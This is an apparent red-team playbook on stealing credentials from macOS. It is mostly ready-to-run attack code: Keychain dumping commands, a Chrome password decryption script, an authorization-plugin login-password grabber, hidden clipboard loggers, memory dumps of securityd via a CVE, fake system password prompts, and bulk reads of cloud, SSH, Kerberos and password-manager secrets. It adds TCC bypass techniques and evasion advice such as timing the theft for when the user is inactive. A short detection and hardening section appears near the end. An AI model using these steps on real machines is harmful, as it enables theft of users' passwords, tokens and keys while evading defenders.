# macOS Credential Access

> **MITRE ATT&CK Mapping**: T1555.001 (Keychain), T1539 (Steal Web Session Cookie), T1552.001 (Credentials In Files), T1555.003 (Credentials from Web Browsers), T1056.001 (Keylogging)
> **Tactic**: Credential Access (TA0006)
> **Platforms**: macOS
> **Required Permissions**: User (most techniques), Root (keychain dump, TCC database direct access, securityd exploitation)
> **OPSEC Risk**: Medium to High (keychain access prompts, TCC protections, EDR monitoring)

---

## Strategic Overview

Credential access on macOS targets a diverse ecosystem of credential stores, from the native Keychain system to browser-specific databases, cloud provider tokens, SSH keys, and Kerberos ticket caches. Unlike Windows, where credentials are centralized in LSASS and the SAM database, macOS distributes secrets across multiple locations and protects them with layered access controls including TCC, the Security framework, and per-application Keychain access control lists (ACLs).

The macOS Keychain is the primary credential store, analogous to the Windows Credential Manager but far more pervasive. It stores Wi-Fi passwords, certificate private keys, application tokens, website passwords, SSH passphrases, and encryption keys. Accessing Keychain items programmatically or via the `security` CLI requires either the user's login password (which unlocks the login keychain automatically at login) or explicit user approval through a dialog prompt. Red team operators must understand the ACL model governing each Keychain item to determine whether silent extraction is possible or whether user interaction is required.

The TCC (Transparency, Consent, and Control) framework represents the most significant barrier to credential access on modern macOS (10.14+). TCC controls access to sensitive locations including ~/Desktop, ~/Documents, ~/Downloads, and application-specific data stores. Bypassing TCC is often a prerequisite for accessing browser credential databases, SSH configurations, and cloud provider tokens stored in user home directories. The 2025-2026 timeframe has seen continued discovery of TCC bypass vulnerabilities, making this an active and evolving area of research for both offensive and defensive teams.

---

## Technical Deep-Dive

### 1. Keychain Access

The macOS Keychain is managed by the `securityd` daemon and accessed via the Security framework or the `security` CLI tool.

**Keychain File Locations:**

| Keychain | Path | Contents |
|----------|------|----------|
| Login Keychain | `~/Library/Keychains/login.keychain-db` | User passwords, certificates, keys |
| System Keychain | `/Library/Keychains/System.keychain` | System-wide certificates, Wi-Fi passwords |
| Local Items | `~/Library/Keychains/<UUID>/keychain-2.db` | iCloud Keychain local items |
| System Root CAs | `/System/Library/Keychains/SystemRootCertificates.keychain` | Apple root CAs |

**security CLI - Primary Credential Extraction:**

```bash
# Find a specific generic password (application password)
security find-generic-password -s "ServiceName" -a "AccountName" -w
# -s: Service name (Label in Keychain Access)
# -a: Account name
# -w: Print only the password value
# -g: Print all attributes including password (to stderr)

# Find internet passwords (website credentials)
security find-internet-password -s "server.example.com" -a "username" -w

# Find Chrome Safe Storage key (needed for browser credential decryption)
security find-generic-password -ga "Chrome" 2>&1 | grep "password:"

# Find Wi-Fi passwords (requires root for system keychain)
security find-generic-password -ga "WiFi_SSID" /Library/Keychains/System.keychain

# Dump all keychain items (metadata only, no passwords)
security dump-keychain ~/Library/Keychains/login.keychain-db

# Dump with passwords (triggers access prompt per-item unless in ACL)
security dump-keychain -d ~/Library/Keychains/login.keychain-db

# List all keychains in search list
security list-keychains

# Unlock a keychain with known password
security unlock-keychain -p "userpassword" ~/Library/Keychains/login.keychain-db

# Set keychain to never auto-lock (prevents relocking during operation)
security set-keychain-settings ~/Library/Keychains/login.keychain-db

# Export certificates and identities
security export -k ~/Library/Keychains/login.keychain-db -t identities -f pkcs12 -o /tmp/certs.p12
security find-certificate -a -c "Developer ID" -p ~/Library/Keychains/login.keychain-db > /tmp/cert.pem
```

**Programmatic Keychain Access (SecItemCopyMatching):**

```swift
import Security

let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecReturnAttributes as String: true,
    kSecReturnData as String: true,
    kSecMatchLimit as String: kSecMatchLimitAll
]

var result: AnyObject?
let status = SecItemCopyMatching(query as CFDictionary, &result)

if status == errSecSuccess, let items = result as? [[String: Any]] {
    for item in items {
        let service = item[kSecAttrService as String] as? String ?? ""
        let account = item[kSecAttrAccount as String] as? String ?? ""
        if let data = item[kSecValueData as String] as? Data,
           let password = String(data: data, encoding: .utf8) {
            print("Service: \(service), Account: \(account), Password: \(password)")
        }
    }
}
```

**Keychain Access Control Lists (ACLs):**

Each Keychain item has an ACL specifying which applications can access it without prompting the user. If the requesting binary is not in the ACL, a dialog appears asking for "Allow" or "Always Allow."

```bash
# Grant security binary access when adding items
security add-generic-password -s "test" -a "user" -w "pass" \
    -T /usr/bin/security ~/Library/Keychains/login.keychain-db

# -T "" (empty) allows ALL applications without prompt
security add-generic-password -s "test" -a "user" -w "pass" \
    -T "" ~/Library/Keychains/login.keychain-db
```

**Chainbreaker - Offline Keychain Forensics:**

```bash
# Install
pip install chainbreaker

# Dump keychain with known user password
chainbreaker --dump-all --db ~/Library/Keychains/login.keychain-db --password "userpassword"

# Dump specific credential types
chainbreaker --dump-generic-passwords --db ~/Library/Keychains/login.keychain-db --password "pass"
chainbreaker --dump-internet-passwords --db ~/Library/Keychains/login.keychain-db --password "pass"
chainbreaker --dump-private-keys --db ~/Library/Keychains/login.keychain-db --password "pass"
```

### 2. TCC Database Exploitation

TCC (Transparency, Consent, and Control) governs access to sensitive user data and system resources. Exploiting TCC is often a prerequisite for credential access.

**TCC Database Locations:**

| Database | Path | Protection |
|----------|------|------------|
| User TCC | `~/Library/Application Support/com.apple.TCC/TCC.db` | Requires FDA or TCC bypass |
| System TCC | `/Library/Application Support/com.apple.TCC/TCC.db` | SIP-protected (root + SIP bypass) |

**TCC Database Schema and Queries:**

```sql
-- Connect to user TCC database (requires Full Disk Access)
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db

-- Dump all granted permissions
SELECT client, service, auth_value FROM access WHERE auth_value = 2;

-- auth_value meanings:
-- 0 = Denied
-- 2 = Allowed
-- 3 = Limited

-- Key TCC service identifiers:
-- kTCCServiceSystemPolicyAllFiles    (Full Disk Access)
-- kTCCServiceScreenCapture           (Screen Recording)
-- kTCCServiceMicrophone              (Microphone)
-- kTCCServiceCamera                  (Camera)
-- kTCCServiceAccessibility           (Accessibility)
-- kTCCServiceAppleEvents             (Automation)
-- kTCCServiceSystemPolicyDesktopFolder
-- kTCCServiceSystemPolicyDocumentsFolder
-- kTCCServiceSystemPolicyDownloadsFolder

-- Find applications with Full Disk Access
SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;

-- Find all permissions for a specific app
SELECT service, auth_value FROM access WHERE client='com.apple.Terminal';
```

**TCC Bypass Techniques (Current as of 2025):**

**a) FDA Inheritance via Authorized Processes:**
```bash
# Processes inherit TCC permissions from their parent
# If Terminal.app has Full Disk Access, all shell commands inherit it
# Identify FDA-granted applications:
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
    "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"
```

**b) Application Version Downgrade Abuse:**
```bash
# Older versions of apps may lack Hardened Runtime or Library Validation
# The injected code inherits the app's existing TCC permissions

# Check if an app has Hardened Runtime
codesign -d --flags /Applications/Target.app/Contents/MacOS/Target 2>&1
# Look for: flags=0x10000(runtime) -- means Hardened Runtime enabled
# If absent, DYLD_INSERT_LIBRARIES injection works
```

**c) Bundled Interpreter Abuse (2025 Research):**
```bash
# Applications that bundle interpreters allow arbitrary code execution
# with inherited TCC permissions

# Example: GIMP bundles Python with inherited TCC grants
/Applications/GIMP.app/Contents/MacOS/python -c "
import os
for f in os.listdir(os.path.expanduser('~/Desktop')):
    print(f)
"

# Similar patterns exist in Electron apps, LibreOffice, Inkscape, and others
```

**d) CVE-2025-43530 - VoiceOver TCC Bypass:**
```bash
# Exploits com.apple.scrod service (part of VoiceOver accessibility framework)
# VoiceOver runs with special system permissions granting broad data access
# Allows execution of arbitrary AppleScript and AppleEvents to any app
# Silent access to files, microphone, and other TCC-protected resources
# No admin privileges required -- local user access is sufficient
# Patched in macOS 26.2, PoC available at time of disclosure
```

**e) CVE-2024-40855 - diskarbitrationd Directory Traversal:**
```bash
# Exploits diskarbitrationd to escape sandbox and mount into TCC directories
# Allows writing to ~/Library/Application Support/com.apple.TCC/
# Can modify user TCC.db to grant permissions to attacker binaries
```

### 3. Chrome/Safari Credential Extraction

#### Chrome Credentials on macOS

Chrome stores credentials in an SQLite database encrypted with a key derived from the "Chrome Safe Storage" Keychain entry.

```bash
# Step 1: Extract Chrome Safe Storage key from Keychain
# WARNING: This WILL trigger a Keychain access prompt
security find-generic-password -ga "Chrome" 2>&1 | grep "password:"
# Output: password: "base64encodedSafeStorageKey"

# Step 2: Chrome credential database locations
~/Library/Application Support/Google/Chrome/Default/Login Data     # Passwords
~/Library/Application Support/Google/Chrome/Default/Cookies        # Cookies
~/Library/Application Support/Google/Chrome/Default/Web Data       # Credit cards, addresses

# Step 3: Copy the database (Chrome locks it while running)
cp ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data /tmp/LoginData

# Step 4: Query encrypted credentials
sqlite3 /tmp/LoginData "SELECT origin_url, username_value, hex(password_value) FROM logins;"
```

**Chrome Decryption (Python):**

```python
import sqlite3
import subprocess
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

# Get Chrome Safe Storage key from Keychain
result = subprocess.run(
    ['security', 'find-generic-password', '-ga', 'Chrome'],
    capture_output=True, text=True
)
safe_storage_key = result.stderr.split('"')[1]

# Derive encryption key using PBKDF2
# Chrome macOS: password=safe_storage_key, salt='saltysalt', iterations=1003, keylen=16
encryption_key = PBKDF2(
    safe_storage_key.encode(),
    b'saltysalt',
    dkLen=16,
    count=1003
)

def decrypt_chrome_password(encrypted_value, key):
    if encrypted_value[:3] == b'v10':
        encrypted_value = encrypted_value[3:]
    iv = b' ' * 16  # 16-byte space IV for macOS
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_value)
    padding_length = decrypted[-1]
    return decrypted[:-padding_length].decode('utf-8')

# Read credentials from database
conn = sqlite3.connect('/tmp/LoginData')
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
for url, username, encrypted_password in cursor.fetchall():
    if encrypted_password:
        password = decrypt_chrome_password(encrypted_password, encryption_key)
        print(f"URL: {url}, User: {username}, Pass: {password}")
conn.close()
```

#### Chrome Cookie Extraction

```bash
# Cookie database location
~/Library/Application Support/Google/Chrome/Default/Cookies

# Copy and query
cp ~/Library/Application\ Support/Google/Chrome/Default/Cookies /tmp/Cookies
sqlite3 /tmp/Cookies "SELECT host_key, name, hex(encrypted_value) FROM cookies WHERE host_key LIKE '%target.com%';"
# Decryption uses the same PBKDF2 + AES-128-CBC process as passwords
```

#### Safari Credentials

```bash
# Safari passwords are stored in iCloud Keychain (more difficult to extract)
# Local credentials are in the login keychain

# Safari cookies (binary plist format)
~/Library/Cookies/Cookies.binarycookies

# Parse binary cookies
python3 -c "
from binarycookies import BinaryCookies
bc = BinaryCookies('$HOME/Library/Cookies/Cookies.binarycookies')
for cookie in bc.cookies:
    print(f'{cookie.domain}: {cookie.name}={cookie.value}')
"

# Safari history (requires TCC/FDA)
sqlite3 ~/Library/Safari/History.db "SELECT url, title FROM history_items ORDER BY visit_count DESC LIMIT 50;"

# Safari form autofill data
~/Library/Safari/Form Values        # Encrypted
~/Library/Safari/Downloads.plist    # Download history
```

### 4. SSH Keys

```bash
# Common SSH key locations
~/.ssh/id_rsa             # RSA private key
~/.ssh/id_ed25519         # Ed25519 private key
~/.ssh/id_ecdsa           # ECDSA private key
~/.ssh/config             # SSH config (hostnames, users, proxy jumps)
~/.ssh/known_hosts        # Known hosts (target enumeration)
~/.ssh/authorized_keys    # Authorized public keys (persistence opportunity)

# Check if SSH agent has loaded keys
ssh-add -l

# macOS Keychain-stored SSH passphrases
# Modern syntax (macOS 12+):
ssh-add --apple-use-keychain ~/.ssh/id_ed25519
# Legacy syntax:
ssh-add -K ~/.ssh/id_rsa

# Extract SSH passphrase from Keychain
security find-generic-password -a "SSH" -l "~/.ssh/id_rsa" -w

# Search for all SSH-related keychain entries
security dump-keychain ~/Library/Keychains/login.keychain-db 2>&1 | grep -B5 -A5 "SSH"

# SSH agent socket (for agent hijacking)
echo $SSH_AUTH_SOCK
# Typical: /private/tmp/com.apple.launchd.XXXXX/Listeners

# Enumerate SSH config for lateral movement targets
cat ~/.ssh/config | grep -E "Host |HostName |User |IdentityFile |ProxyJump "
# Look for ForwardAgent yes -- agent forwarding enables remote hijacking
```

### 5. Authorization Plugin Credential Interception

Authorization plugins run during the macOS login process and can capture cleartext credentials. They are installed in `/Library/Security/SecurityAgentPlugins/` and registered in the authorization database.

**Credential Capture Flow:**
1. User enters credentials at login window
2. `builtin:authenticate,privileged` validates the password
3. Custom plugin receives context including validated cleartext password
4. Plugin logs/exfiltrates username and password
5. Plugin allows authentication to proceed normally

**Context Values Available:**
- `kAuthorizationEnvironmentUsername` - Plaintext username
- `kAuthorizationEnvironmentPassword` - Validated cleartext password
- `uid` - User ID
- `home` - Home directory path

**Credential Capture Pseudo-Code:**

```c
// Plugin receives context after builtin:authenticate,privileged validates the password
OSStatus MechanismInvoke(AuthorizationMechanismRef mechanism) {
    const AuthorizationValue *value;
    AuthorizationContextFlags flags;

    // Get username
    callbacks->GetContextValue(mechanism, kAuthorizationEnvironmentUsername, &flags, &value);
    char *username = (char *)value->data;

    // Get cleartext password
    callbacks->GetContextValue(mechanism, kAuthorizationEnvironmentPassword, &flags, &value);
    char *password = (char *)value->data;

    // Exfiltrate (write to hidden file, send over network, etc.)
    FILE *f = fopen("/var/tmp/.auth_cache", "a");
    fprintf(f, "%s:%s\n", username, password);
    fclose(f);

    // Allow authentication to proceed
    return callbacks->SetResult(mechanism, kAuthorizationResultAllow);
}
```

See the persistence file (Section 7) for detailed installation instructions.

### 6. Clipboard Monitoring

```bash
# One-shot clipboard read
pbpaste

# Continuous clipboard monitoring (shell)
while true; do
    current=$(pbpaste 2>/dev/null)
    if [ "$current" != "$last" ] && [ -n "$current" ]; then
        echo "$(date '+%Y-%m-%d %H:%M:%S') | $current" >> /tmp/.clipboard.log
        last="$current"
    fi
    sleep 2
done &

# JXA-based clipboard monitoring
osascript -l JavaScript -e '
var app = Application.currentApplication();
app.includeStandardAdditions = true;
var lastContent = "";
while (true) {
    try {
        var clipboard = app.theClipboard();
        if (clipboard !== lastContent && clipboard.length > 0) {
            var date = new Date().toISOString();
            app.doShellScript("echo \"" + date + ": " + clipboard.replace(/"/g, "") + "\" >> /tmp/.cb_log");
            lastContent = clipboard;
        }
    } catch(e) {}
    delay(1);
}'
```

**Programmatic Clipboard Access (Objective-C):**

```objectivec
#import <AppKit/AppKit.h>

NSPasteboard *pasteboard = [NSPasteboard generalPasteboard];
NSInteger lastChangeCount = 0;

while (1) {
    NSInteger currentChangeCount = [pasteboard changeCount];
    if (currentChangeCount != lastChangeCount) {
        NSString *content = [pasteboard stringForType:NSPasteboardTypeString];
        if (content) {
            NSLog(@"Clipboard: %@", content);
        }
        lastChangeCount = currentChangeCount;
    }
    [NSThread sleepForTimeInterval:0.5];
}
```

**Note:** Starting with macOS Ventura, reading the clipboard from background processes may trigger a TCC notification. Test clipboard access in the specific operational context.

### 7. Kerberos on macOS

macOS supports Kerberos authentication, commonly used in enterprise environments with Active Directory integration.

```bash
# List current Kerberos tickets
klist

# Kerberos ticket cache location
/tmp/krb5cc_<uid>              # Default file-based cache
echo $KRB5CCNAME               # May show API: or FILE: prefix

# Kerberos configuration
/etc/krb5.conf
/Library/Preferences/edu.mit.Kerberos

# Request a new TGT with known credentials
kinit user@REALM.COM

# Request a service ticket
kvno host/server.realm.com@REALM.COM

# Export tickets for offline use (copy ccache file)
cp /tmp/krb5cc_$(id -u) /tmp/krb5cc_exfil
# On attacker machine: export KRB5CCNAME=/path/to/krb5cc_exfil

# Keytab extraction (if available)
klist -k /etc/krb5.keytab
klist -kte /etc/krb5.keytab    # Show encryption types and keys

# Active Directory integration artifacts
dsconfigad -show
dscl /Active\ Directory/ -read /

# Kerberos SSO Extension (Enterprise)
# Check for Kerberos SSO extension
system_profiler SPExtensionsDataType 2>/dev/null | grep -i kerberos
# SSO extension tokens: ~/Library/Group Containers/<team-id>.com.apple.KerberosExtension/
```

### 8. Cloud Credentials

```bash
# === AWS CLI Credentials ===
cat ~/.aws/credentials                    # Access keys in plaintext
cat ~/.aws/config                         # Region, profile config
ls -la ~/.aws/sso/cache/                  # SSO session tokens (JSON)
cat ~/.aws/sso/cache/*.json               # Actual SSO tokens
grep "credential_process" ~/.aws/config   # External credential sources

# === Azure CLI Credentials ===
cat ~/.azure/msal_token_cache.json        # MSAL token cache (current)
cat ~/.azure/azureProfile.json            # Subscription info, tenant IDs
cat ~/.azure/accessTokens.json            # Legacy OAuth tokens (deprecated)

# === Google Cloud (gcloud) Credentials ===
cat ~/.config/gcloud/credentials.db
cat ~/.config/gcloud/access_tokens.db
cat ~/.config/gcloud/application_default_credentials.json  # ADC
cat ~/.config/gcloud/properties

# === Kubernetes Credentials ===
cat ~/.kube/config                        # Cluster configs, tokens, certificates

# === Docker Credentials ===
cat ~/.docker/config.json                 # Registry auth tokens (base64 user:pass)

# === GitHub CLI ===
cat ~/.config/gh/hosts.yml                # GitHub OAuth tokens

# === Other Token Files ===
cat ~/.npmrc                              # npm tokens
cat ~/.pypirc                             # PyPI credentials
cat ~/.netrc                              # Generic network credentials
cat ~/.git-credentials                    # Plaintext git credentials

# === Environment Variables ===
env | grep -iE "key|secret|token|password|api|auth|credential"

# === Service Account Keys (high-value) ===
find ~ -name "*service*account*.json" -o -name "*credentials*.json" 2>/dev/null
```

### 9. Password Manager Extraction

#### 1Password

```bash
# 1Password CLI (if installed and authenticated)
op whoami
op item list
op item get "Item Name" --fields password

# 1Password desktop data locations
~/Library/Group Containers/2BUA8C4S2C.com.1password/
~/Library/Application Support/1Password/
~/Library/Group Containers/2BUA8C4S2C.com.1password/Library/Application Support/1Password/Data/

# Session tokens may be cached
env | grep OP_SESSION
```

#### Bitwarden

```bash
# Bitwarden CLI
bw status    # Check login state
bw list items  # List all items (requires unlock)

# Bitwarden desktop data
~/Library/Application Support/Bitwarden/
~/Library/Application Support/Bitwarden/data.json  # Vault data (encrypted)
```

#### General Password Manager Approach

```bash
# Search for common password manager databases and files
find ~ -name "*.kdbx" 2>/dev/null              # KeePass databases
find ~ -name "*.1pif" 2>/dev/null               # 1Password interchange format
find ~ -name "logins.json" 2>/dev/null          # Firefox passwords
find ~ -name "key4.db" 2>/dev/null              # Firefox key database
find ~ -name "Passwords.plist" 2>/dev/null      # Various apps
```

### 10. securityd Exploitation

The `securityd` daemon manages Keychain access and cryptographic operations. It is a high-value target for broad credential extraction.

```bash
# securityd process information
ps aux | grep securityd
# /usr/sbin/securityd - runs as root, manages all Keychain operations

# Check securityd entitlements
codesign -d --entitlements - /usr/sbin/securityd

# Monitor securityd interactions
log show --predicate 'process == "securityd"' --last 5m
```

**CVE-2025-24204 - Process Memory Disclosure via gcore:**

```bash
# Apple mistakenly granted /usr/bin/gcore the com.apple.system-task-ports.read
# entitlement in macOS 15.0 (Sequoia), allowing reading the memory of ANY process,
# even with SIP enabled.

# Check if gcore has the dangerous entitlement
codesign -d --entitlements - /usr/bin/gcore 2>&1

# If exploitable (macOS 15.0 through 15.3):
sudo gcore -o /tmp/securityd_dump $(pgrep securityd)
strings /tmp/securityd_dump.core | grep -iE "password|secret|token|key"

# Could also dump:
sudo gcore -o /tmp/authd_dump $(pgrep authd)           # Authorization daemon
sudo gcore -o /tmp/loginwindow $(pgrep loginwindow)     # Login window process

# Fixed in macOS 15.4 (entitlement removed from gcore)
```

**Fake Authentication Prompt (Social Engineering):**

```bash
# Fake authentication prompt using osascript
osascript -e 'tell app "System Preferences" to activate' -e \
    'tell app "System Preferences" to display dialog "System Preferences wants to make changes. Enter your password to allow this." default answer "" with hidden answer'

# JXA variant (more customizable)
osascript -l JavaScript -e '
var app = Application.currentApplication();
app.includeStandardAdditions = true;
var result = app.displayDialog(
    "macOS wants to make changes. Type your password to allow this.",
    {defaultAnswer: "", hiddenAnswer: true, withTitle: "Security & Privacy"});
result.textReturned;'
```

---

## 2025 Techniques

### CVE-2025-43530: TCC Bypass via VoiceOver (ScreenReader.framework)

The most significant credential-access-relevant vulnerability discovered in 2025. This CVE allows complete TCC bypass through the VoiceOver accessibility framework:

- **Attack vector:** Local exploitation via the `com.apple.scrod` service
- **Impact:** Silent access to all TCC-protected resources (files, microphone, camera)
- **No admin required:** Exploitable with standard user privileges
- **Credential access use:** Bypass TCC to access browser databases, SSH keys, cloud tokens
- **Patched in:** macOS 26.2
- **PoC status:** Public at time of disclosure

### CVE-2025-24204: Process Memory Disclosure via gcore

Apple mistakenly granted `/usr/bin/gcore` the `com.apple.system-task-ports.read` entitlement in macOS 15.0 (Sequoia), allowing reading the memory of ANY process even with SIP enabled:

- Dump securityd memory to extract Keychain decryption keys
- Extract in-memory credentials from running applications
- Read Kerberos ticket data from memory
- Access browser process memory for session tokens
- Fixed in macOS 15.4

### CERT Polska TCC Bypass Research (August 2025)

CERT Polska published research documenting TCC bypass vulnerabilities in six common macOS applications. The common pattern involves bundled interpreters (Python, Node.js) that inherit the parent application's TCC permissions:

- Applications with bundled Python interpreters inherit TCC grants
- Electron apps with writable configuration directories allow code injection
- Developer tools with scripting capabilities serve as TCC bypass vectors
- CVE-2025-15523 (Inkscape TCC bypass, January 2026) continues this pattern

### Browser Credential Encryption Updates (2025)

Chrome introduced App-Bound Encryption on some platforms, though macOS still primarily relies on the Keychain-based Safe Storage model. The HackBrowserData tool maintains up-to-date decryption support for multiple browsers:

```bash
# Check Chrome version for encryption method
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --version

# HackBrowserData supports: Chrome, Edge, Brave, Firefox, Safari
# https://github.com/moonD4rk/HackBrowserData
```

### Cloud Token Harvesting (2025 Focus)

As organizations adopt cloud-native workflows, cloud credential extraction has increased in value:

```bash
# Modern AWS SSO token extraction
python3 -c "
import json, glob, os
for f in glob.glob(os.path.expanduser('~/.aws/sso/cache/*.json')):
    with open(f) as fh:
        data = json.load(fh)
        if 'accessToken' in data:
            print(f'Region: {data.get(\"region\")}, Token: {data[\"accessToken\"][:30]}...')
"

# Azure CLI modern token extraction
python3 -c "
import json
with open(os.path.expanduser('~/.azure/msal_token_cache.json')) as f:
    data = json.load(f)
    for key, token in data.get('AccessToken', {}).items():
        print(f'Target: {token.get(\"target\")}, Expires: {token.get(\"expires_on\")}')
"
```

---

## Detection & Defense

### Detection Indicators

| Indicator | Detection Method |
|-----------|-----------------|
| `security find-generic-password` | Command-line audit logging, ES process events |
| `security find-internet-password` | Process argument monitoring |
| `security dump-keychain` | Endpoint Security process events |
| Keychain access prompts | User awareness training |
| TCC.db direct access | File access monitoring on TCC.db paths |
| Chrome Login Data access | File read events on Chrome profile directory |
| SSH directory enumeration | File access monitoring on ~/.ssh/ |
| Clipboard rapid reads | Process behavior analysis |
| gcore on securityd | Process execution monitoring |
| osascript with hidden answer | Script content analysis |

### Key Detection Queries

```bash
# Unified Log: Keychain access events
log show --predicate 'subsystem == "com.apple.securityd" AND category == "keychain"' --last 1h

# TCC access decisions
log show --predicate 'subsystem == "com.apple.TCC" AND category == "access"' --last 1h

# Security CLI usage
log show --predicate 'process == "security"' --last 5m

# Authorization plugin activity
log show --predicate 'process == "SecurityAgent"' --last 1h
```

### Endpoint Security Framework Events

```
ES_EVENT_TYPE_AUTH_OPEN     - File open authorization (TCC.db, keychain access)
ES_EVENT_TYPE_NOTIFY_OPEN   - File open notification
ES_EVENT_TYPE_NOTIFY_EXEC   - Process execution (security CLI)
ES_EVENT_TYPE_NOTIFY_AUTHENTICATION - Authentication events
ES_EVENT_TYPE_NOTIFY_XPC_CONNECT   - XPC connections to securityd
```

### Hardening Recommendations

1. **Keychain ACL audit**: Review and restrict per-item application access
2. **TCC enforcement**: Ensure applications request minimum necessary TCC permissions
3. **Browser credential managers**: Prefer dedicated password managers over browser storage
4. **SSH key management**: Use hardware tokens (YubiKey) for SSH keys; avoid storing passphrases in Keychain
5. **Cloud credential rotation**: Implement short-lived tokens and automatic rotation
6. **Clipboard clearing**: Configure automatic clipboard clearing after timeout
7. **Full Disk Access audit**: Regularly review FDA grants in System Settings
8. **macOS updates**: Apply security updates promptly (especially for TCC bypass fixes)
9. **EDR deployment**: Use ES-based EDR to monitor credential access patterns
10. **Authorization plugin monitoring**: Alert on changes to /Library/Security/SecurityAgentPlugins/

---

## OPSEC Considerations

### Keychain Access Prompts

The most significant OPSEC risk is triggering Keychain access dialogs:
- Check the ACL before attempting access (dump-keychain shows ACL info)
- Use applications already in the ACL to proxy the request
- Time credential access to periods of active user activity
- Target specific high-value items rather than dumping everything

### TCC Dialog Avoidance

- Identify applications with existing TCC grants before requesting new ones
- Leverage FDA-granted applications as proxies for file access
- Use TCC bypass techniques (CVEs) to avoid prompts entirely
- Check user TCC.db for current grants before acting

### Browser Credential Timing

- Chrome locks its Login Data database while running -- copy it
- The Keychain access prompt for "Chrome Safe Storage" may alert the user
- Extract the Safe Storage key before accessing the database
- Time extraction to when the browser is running (databases unlocked) but user is inactive

### Cloud Credentials as Low-Risk Targets

- Cloud credential files are typically readable by the user without additional prompts
- This makes them low-risk, high-value targets -- prioritize these
- Note token expiration times and plan for re-extraction
- Cloud providers log token usage; using tokens from unexpected IPs triggers alerts

### Log Artifact Minimization

```bash
# Prefer programmatic APIs over CLI tools
# SecItemCopyMatching generates fewer log entries than security CLI
# Compile a custom tool for Keychain access rather than using /usr/bin/security

# Check what is being logged
log show --predicate 'process == "security"' --last 5m
```

---

## Cross-References

- [macOS Persistence Mechanisms](../04-persistence/macos-persistence.md) - Authorization plugin installation for credential interception
- [macOS Privilege Escalation](../05-privilege-escalation/macos-privesc.md) - TCC bypass and privilege escalation for credential access

---

## References

- MITRE ATT&CK T1555.001 - Credentials from Password Stores: Keychain - https://attack.mitre.org/techniques/T1555/001/
- MITRE ATT&CK T1539 - Steal Web Session Cookie - https://attack.mitre.org/techniques/T1539/
- MITRE ATT&CK T1552.001 - Unsecured Credentials: Credentials In Files - https://attack.mitre.org/techniques/T1552/001/
- MITRE ATT&CK T1555.003 - Credentials from Web Browsers - https://attack.mitre.org/techniques/T1555/003/
- Wojciech Regula - macOS Red Teaming: Bypass TCC with old apps - https://wojciechregula.blog/post/macos-red-teaming-bypass-tcc-with-old-apps/
- XPN InfoSec Blog - Bypassing MacOS Privacy Controls - https://blog.xpnsec.com/bypassing-macos-privacy-controls/
- CERT Polska - TCC Bypass vulnerabilities in six applications for macOS (2025) - https://cert.pl/en/posts/2025/08/tcc-bypass/
- CERT Polska - TCC Bypass in Inkscape (CVE-2025-15523, 2026) - https://cert.pl/en/posts/2026/01/CVE-2025-15523/
- CVE-2025-43530 - macOS TCC bypass via VoiceOver ScreenReader.framework - https://cyberpress.org/new-macos-tcc-bypass-vulnerability/
- CVE-2024-40855 - diskarbitrationd TCC bypass - https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_en/
- CVE-2025-24204 - gcore process memory disclosure - https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/
- n0fate/chainbreaker - Keychain forensic tool - https://github.com/n0fate/chainbreaker
- HackTricks - macOS TCC - https://book.hacktricks.wiki/en/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc
- xorrior - Persistent Credential Theft with Authorization Plugins - https://www.xorrior.com/persistent-credential-theft/
- Scripting OS X - Get Password from Keychain in Shell Scripts - https://scriptingosx.com/2021/04/get-password-from-keychain-in-shell-scripts/
- SS64.com - macOS Security Command Reference - https://ss64.com/mac/security.html
- moonD4rk/HackBrowserData - Browser credential extraction - https://github.com/moonD4rk/HackBrowserData
- Elastic Detection Rules - Keychain Password Retrieval - https://detection.fyi/elastic/detection-rules/macos/credential_access_keychain_pwd_retrieval_security_cmd/
- Nicholas Frischkorn - Red Teaming macOS 101 - https://frischkorn-nicholas.medium.com/red-teaming-macos-101-33b5a1834a2e
- lutzenfried - MacOS Intrusion Methodology - https://github.com/lutzenfried/Methodology/blob/main/13%20-%20MacOS%20intrusion.md
